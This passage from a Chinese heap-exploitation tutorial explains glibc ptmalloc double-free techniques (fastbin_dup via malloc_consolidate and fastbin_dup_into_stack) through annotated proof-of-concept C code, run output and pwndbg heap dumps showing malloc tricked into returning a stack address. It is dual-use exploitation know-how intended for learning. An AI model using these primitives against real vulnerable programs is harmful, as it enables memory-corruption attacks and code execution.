下面就是一点点的拓展
然后如果连large bin中都没有合适的,那就只能从top chunk中分割出一部分了,如果连top
chunk也不满足,那就会mmap或brk一块内存增加top chunk的大小
**part 3**
之后我们继续调试,我们现在第二次free p1,此时的堆结构
    pwndbg> heap
    0x602000 FASTBIN {
      prev_size = 0,
      size = 81,
      fd = 0x0,
      bk = 0x7ffff7dd1bb8 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 {
      prev_size = 80,
      size = 80,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6020a0 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6024b0 PREV_INUSE {
      prev_size = 0,
      size = 133969,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x602000 ◂— 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x50 [corrupted]
    FD: 0x602000 ◂— 0x0
    BK: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000
    largebins
    empty
这里就可以看到他既在smallbins中又在fastbin中了,这又是为什么呢?
因为再free的时候ptmalloc会发现fastbin是空的,因此就把他扔到fastbin中去了
此时就可以分配两次p1了,一次系统会在fastbin中取出(优先查看fastbin),第二次就会在smallbins中取出:)
###  总结
程序先malloc了两个fastbin chunk(0x40),然后free掉第一个chunk
这里为啥不free第二个呢,因为如果free第二个的话就会和top chunk相邻了,此时会触发top chunk的合并
之后程序调用了malloc函数malloc了一个large
bin,触发了malloc_consoldate()函数,导致我们free掉的chunk1被放入了small bin中
然后程序第二次free chunk1,ptmalloc会先看fastbin中有没有,发现没有,于是就把chunk1放到fast
bin中了,这时chunk1就在fastbin和smallbin中各有一个
此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户
我们就有了两个拥有同样内存的chunk
## 0x04 fastbin_dup_into_stack
###  源代码
这里我也加了一点点小翻译:)
    #include 
    #include 
    int main()
    {
            //这个程序就是fast_dup.c的2.0版本,作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时在我们所能控制的栈上分配
            fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc inton"
                   "returning a pointer to a controlled location (in this case, the stack).n");
            unsigned long long stack_var;
            //我们控制分配的地址就是这个栈上变量的地方
            fprintf(stderr, "The address we want malloc() to return is %p.n", 8+(char *)&stack_var);
            fprintf(stderr, "Allocating 3 buffers.n");
            int *a = malloc(8);
            int *b = malloc(8);
            int *c = malloc(8);
            fprintf(stderr, "1st malloc(8): %pn", a);
            fprintf(stderr, "2nd malloc(8): %pn", b);
            fprintf(stderr, "3rd malloc(8): %pn", c);
            fprintf(stderr, "Freeing the first one...n");
            free(a);
            //这里还是一样的,不能连续释放同一个chunk
            fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.n", a, a);
            // free(a);
            fprintf(stderr, "So, instead, we'll free %p.n", b);
            free(b);
            //这里再次,释放a,double free
            fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.n", a);
            free(a);
            fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
                    "We'll now carry out our attack by modifying data at %p.n", a, b, a, a);
            //现在第一次分配内存,取出chunk a 赋给chunk d
            unsigned long long *d = malloc(8);
            //现在分配两次内存,取出chunk a,chunk b
            fprintf(stderr, "1st malloc(8): %pn", d);
            fprintf(stderr, "2nd malloc(8): %pn", malloc(8));
            //现在free list就只剩下一个chunk a了
            fprintf(stderr, "Now the free list has [ %p ].n", a);
            //现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了
            fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.n"
                    "so now we are writing a fake free size (in this case, 0x20) to the stack,n"
                    "so that malloc will think there is a free chunk there and agree ton"
                    "return a pointer to it.n", a);
            stack_var = 0x20;
            //现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d
            fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.n", a);
            *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
            //这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了
            fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free listn", malloc(8));
            fprintf(stderr, "4th malloc(8): %pn", malloc(8));
    }
###  运行结果
    This file extends on fastbin_dup.c by tricking malloc into
    returning a pointer to a controlled location (in this case, the stack).
    The address we want malloc() to return is 0x7ffe5c42b638.
    Allocating 3 buffers.
    1st malloc(8): 0x632010
    2nd malloc(8): 0x632030
    3rd malloc(8): 0x632050
    Freeing the first one...
    If we free 0x632010 again, things will crash because 0x632010 is at the top of the free list.
    So, instead, we'll free 0x632030.
    Now, we can free 0x632010 again, since it's not the head of the free list.
    Now the free list has [ 0x632010, 0x632030, 0x632010 ]. We'll now carry out our attack by modifying data at 0x632010.
    1st malloc(8): 0x632010
    2nd malloc(8): 0x632030
    Now the free list has [ 0x632010 ].
    Now, we have access to 0x632010 while it remains at the head of the free list.
    so now we are writing a fake free size (in this case, 0x20) to the stack,
    so that malloc will think there is a free chunk there and agree to
    return a pointer to it.
    Now, we overwrite the first 8 bytes of the data at 0x632010 to point right before the 0x20.
    3rd malloc(8): 0x632010, putting the stack address on the free list
    4th malloc(8): 0x7ffe5c42b638
###  关键部分调试
本次程序我在第41行,也就是给stack赋值之前的地方,第49行即给d赋值后,最后一个是在52行即最后的地方下断点
此时运行程序,我们看一下堆:
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x603020,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603020 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x603000,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603040 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20fa1
    }
    0x603060 PREV_INUSE {
      prev_size = 0,
      size = 135073,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    pwndbg>
可以看到这个时候我们已经有了一个free的回环链
程序继续运行,d已经赋完了值,我们可以看到他的fb指针已经是stack_var的地址了
    pwndbg> x/10gx 0x603000
    0x603000:       0x0000000000000000      0x0000000000000021
    0x603010:       0x00007fffffffe5f8      0x0000000000000000
    0x603020:       0x0000000000000000      0x0000000000000021
    0x603030:       0x0000000000603000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000021
这个时候我们看看bins
    pwndbg> bins
    fastbins
    0x20: 0x603000 —▸ 0x7fffffffe5f8 —▸ 0x603010 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
可以看到free list中已经有了栈指针,那么这个时候我们再分配就可以分配到栈的内存空间了
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x7fffffffe5f8,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603020 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x603000,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603040 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20fa1
    }
    0x603060 PREV_INUSE {
      prev_size = 0,
      size = 135073,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
###  总结
程序先在栈上定义了一个变量stack_var
之后malloc了三个chunk a,b,c
之后做了一个double free,形成了一个a->b->a的free链
此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a
之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了
此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake
chunk,形成了一个新的free链
最后再申请内存的时候,我们就取出了栈上的内存
如上